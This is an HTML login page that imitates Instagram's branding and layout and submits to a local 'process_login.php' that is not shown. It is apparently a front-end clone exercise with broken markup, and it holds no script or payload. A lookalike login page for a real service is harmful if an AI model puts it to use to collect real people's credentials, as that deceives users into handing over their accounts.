<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Instagram</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="css/login.css">
    <link rel="stylesheet" href="css/reponsive.css">
</head>

<body>
	<div class="whole container">
			<div class="row">
				<div class="col-md-6 image">
					<img src="img/app-features.png" alt="">
				</div>
				<div class="col-md-6 text-center account">
					<form action="process_login.php" method ="POST">
					<div class="top">
							<div class="logo">
							<img src="img/instagram-logo.png" alt="">
							</div>
						</div>
						<div class="form_login">
							<form method="post">
								<div class="Account_name">
									<input type="username" class="form-control" name="" id="" placeholder="Phone Number, Username or Email">
								</div>
								<div class="account_password">
									<input type="password" class="form-control" required autofocus placeholder="Password">
								</div>
								<div class="login">
								<button class="mt-2 btn btn-primary w-100" type="login" name="login">
									Log In
								</button>
								</div>
							</form>
							<div class="or">
								<div class="line"></div>
								<span>OR</span>
								<div class="line"></div>
							</div>
							<div class="otherMethods">
								<div class="primaryColor">
                                       <p>
                                        <img src="img/facebook-logo.png" class="img-fluid rounded" alt="[+]"
                                        style="width: 18px;height: 18px">
                                         <a style="text-decoration:none" href="https://www.facebook.com/">Login to facebook</a>.
                                         </p>							
                                      								
                                     </div>
										 <a style="text-decoration:none" class="reset" href="ForgottenPassword.php" tabindex="0">Forgot password?</a>
                            <div>
					</div>
					<div class="card my-2">
						<div class="card-body">
							<span>Don't have an account?</span><span class="primaryColor"><a style="text-decoration:none" class="signup" href="SignUp.php" tabindex="0">Sign up</a>
						</div>
					</div>
					<span>Get the app.</span>
					<div class="row py-2">
						<div class="col-6"><img src="img/playstore.png" alt="[+]" class="img-fluid d-block rounded" />
						</div>
						<div class="col-6"><img src="img/appstore.png" alt="[+]" class="img-fluid d-block rounded" />
						</div>
					</div>
				</div>
			</div>
	</div>
	
	<div class="footer container">
                    
                    <div class=" row footer_list">               
                            <a href="https://about.facebook.com/meta">Meta</a>
                            <a href="https://about.instagram.com/">About</a>
                            <a href="https://about.instagram.com/en_US/blog">Blog</a></li>
                            <a href="https://about.instagram.com/about-us/careers">Job</a>
                            <a href="https://help.instagram.com/">Help</a>
                            <a href="https://developers.facebook.com/docs/instagram">API</a></li>
                            <a href="https://help.instagram.com/519522125107875">Privacy</a> 
                            <a href="https://help.instagram.com/581066165581870">Terms</a>
                            <a href="https://www.instagram.com/directory/profiles/">Top account</a>
                            <a href="https://www.instagram.com/directory/hashtags/"> Hashtag</a>
                            <a href="https://www.instagram.com/explore/locations/"> Location</a>
                            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>     
                    </div>
                    <div class=" row footer_list">               
                            <a href="https://www.instagram.com/topics/beauty/">Beauty</a>
                            <a href="https://www.instagram.com/topics/dance-and-performance/">Dance</a></li>
                            <a href="https://www.instagram.com/topics/fitness/">Fitness</a>
                            <a href="https://www.instagram.com/topics/food-and-drink/">Food & Drink</a>
                            <a href="https://www.instagram.com/topics/home-and-garden/">Home & Garden</a></li>
                            <a href="https://www.instagram.com/topics/music/">Music</a>
                            <a href="https://www.instagram.com/topics/visual-arts/">
                                Nghệ thuật thị giác</a>              
                    </div>
              <div class="fn">
                        <div class="fn2">
                            © 2021 Instagram from Meta
                        </div>
                    </div>
                </div>
            </div>
</body>

</html>